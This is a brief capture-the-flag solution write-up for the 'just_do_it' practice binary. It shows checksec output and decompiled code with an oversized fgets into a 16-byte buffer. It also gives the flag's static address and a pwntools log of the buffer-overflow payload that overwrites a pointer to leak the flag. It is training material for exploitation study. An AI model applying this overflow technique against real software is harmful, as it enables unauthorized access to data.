# Soln.md

```
pwndbg> checksec
File:     /home/pwent/code/personal/CTF/Nightmare/pwn/just_do_it/just_do_it
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

Looking at the code,

```
undefined4 main(void)
{
  char *fgets_res;
  ...
  char user_input [16];
  FILE *flag_fd;
  char *message;
  ...

  flag_fd = fopen("flag.txt","r");
  ...

  fgets_res = fgets(flag,0x30,flag_fd);
  ...

  fgets_res = fgets(user_input,32,stdin);
  ...

  puts(message);
}
```

Of note, 32 bytes are read into `user_input[16]`, allowing us to overwrite `message` with the address
of `flag`. Since PIE is disabled, the address will remain static.

```
0804a080 B flag
```

```sh
❯ python soln.py
[+] Starting local process './just_do_it' argv=[b'./just_do_it'] : pid 852164
[DEBUG] Received 0x49 bytes:
    b'Welcome my secret service. Do you know the password?\n'
    b'Input the password.\n'
[DEBUG] Sent 0x19 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  42 42 42 42  80 a0 04 08  0a                        │BBBB│····│·│
    00000019
[+] Receiving all data: Done (11B)
[*] Process './just_do_it' stopped with exit code 0 (pid 852164)
[DEBUG] Received 0xb bytes:
    b'flag{XXX}\n'
    b'\n'
```
